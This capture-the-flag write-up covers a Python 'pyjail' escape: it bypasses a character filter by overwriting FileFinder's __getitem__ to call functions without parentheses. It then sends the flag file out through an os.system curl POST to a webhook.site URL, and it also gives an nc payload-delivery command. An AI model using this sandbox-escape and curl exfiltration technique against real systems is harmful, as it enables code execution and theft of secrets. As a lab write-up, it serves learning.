# The pyjail

Pyjail challenge over TCP: your code is filtered to a tiny character set and
`eval`'d with almost no builtins, and its stdout never reaches you. Key idea:
overwrite a `FileFinder` class's `__getitem__` to build a call primitive without
parentheses, then exfiltrate the flag with outbound `curl`.

## Recon
- Files: `jail.py`, `run.sh`, `Dockerfile` (`python:3.15-rc-slim`). Flag at
  `/flag.txt`, `chmod 400`. The container has `curl` and outbound internet.
- `jail.py` listens on TCP 1234, reads input until a line `END`, then writes a
  static `user.py`:
  ```python
  code = ''.join(c for c in open("user_input").read() if c in "abcdefghijklmnopqrstuvwxyz:_.[],")
  if "ass" in code or "typ" in code or "als" in code:
      print("Nope")
  else:
      eval(code, {"__builtins__": {"idk":idk,"sys":sys}})
  ```
  and runs it via `os.system("python3 user.py")` in a thread.
- Consequences: no parens, quotes, digits, spaces, or operators; expression-only
  `eval`; `__class__` and `type` are blocked (contain `ass` / `typ`); the child's
  stdout/stderr go to the container console, **not** the client socket.

## Analysis
- Observation: `eval` receives only `idk` and `sys`, but `idk.__builtins__` is the
  full builtins dict and `idk.__globals__` is `user.py`'s globals.
- Known trick (jailctf-2025-impossible): no-space list-comprehension assignment
  `[[]for[a]in[[b]]]` binds `a=b`; setting `obj.__class__.__getitem__` to a callable
  makes `obj[arg]` call it. Here `__class__` is blocked.
- Confirmation: reach the mutable, Python-defined `FileFinder` class without
  `__class__` via `sys.path_hooks[1].__closure__[0].cell_contents`; its
  `__getitem__` can be overwritten. Set it to `sys.__package__.join` (empty-string
  join) to build arbitrary strings from per-character slice expressions, then
  subscript a `FileFinder` instance (`sys.path_importer_cache[sys.path[2]]`) to call
  builtins/bound methods with one argument.
- Exfil: writing to the inherited socket fd fails (the `os.system` child does not
  inherit it, PEP 446 CLOEXEC). Use outbound `curl` instead (confirmed: the
  container reached webhook.site with curl 8.14.1).

## Exploit
1. Build the no-parens call primitive (bind + overwrite):
   ```
   [[]for[sys.path_hooks[1].__closure__[0].cell_contents.__getitem__]in[[sys.__package__.join]]]
   ```
2. Build the command string as a list of per-char slices and call it through the
   subscripted `FileFinder` instance.
3. Wrap it in an `exec` of: read `/flag.txt`, strip whitespace, then
   `os.system("curl -s -d <flag> https://webhook.site/<uuid>")`.
4. Send the generated payload (`solve/payload_curl_flag.txt`, ~7 KB of per-char
   slices) to TCP 1234, terminated with `END`.
5. Read the flag from the webhook POST body.

## Full chain
1. `nc <host> 1234 < payload_curl_flag.txt` followed by a line `END`
2. read `https://webhook.site/<uuid>` POST body → flag

## Flag
TFCCTF{i_hope_this_is_not_the_last_jail}

## Lessons
- Immutable builtin types refuse attribute mutation; pick a mutable Python-defined
  class instance (`FileFinder` via the `path_hooks` closure) for the
  subscript-call primitive.
- When the child process cannot write back to the socket, outbound HTTP (`curl`) is
  a reliable exfil if egress is allowed.
